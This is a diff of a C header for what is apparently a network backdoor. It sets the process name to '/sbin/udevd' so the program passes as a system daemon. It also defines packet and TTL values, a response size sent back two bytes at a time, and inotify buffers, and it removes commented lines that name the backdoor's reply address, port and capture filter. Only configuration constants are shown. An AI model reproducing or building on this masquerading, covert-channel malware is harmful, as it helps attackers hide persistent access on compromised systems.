@@ -41,25 +41,18 @@
 | ------------------------------------------------------------------------------
 */
 
-#define PROCESS_NAME        "/sbin/udevd --daemon"
+#define PROCESS_NAME        "/sbin/udevd"
 
 // Packet Size
 #define PKT_SIZE            4096
-// Response Size
-#define MESSAGE_MAX_SIZE    40
+
+// Response Size (Sent back 2 bytes at a time)
+#define MESSAGE_MAX_SIZE    4096
 
 // TCP Defaults
 #define WIN_SIZE            55840
 #define DEFAULT_TTL         255
 #define DEFAULT_IP_ID       12345
-
-// TODO
-// Thread the Watch
-// Set timeout on server
-// Set pcap filter on command line
-//#define DEFAULT_SRC_IP      "192.168.1.76"    // Client address. Backdoor replies
-//#define DEFAULT_SRC_PORT    34231             // will be sent to this address and port
-//#define BD_FILTER           "src port 12345 and dst port 54321 and tcp"
 
 #define EVENT_SIZE          (sizeof(struct inotify_event))
 #define EVENT_BUF_LEN       (1024 * ( EVENT_SIZE + 16 ))
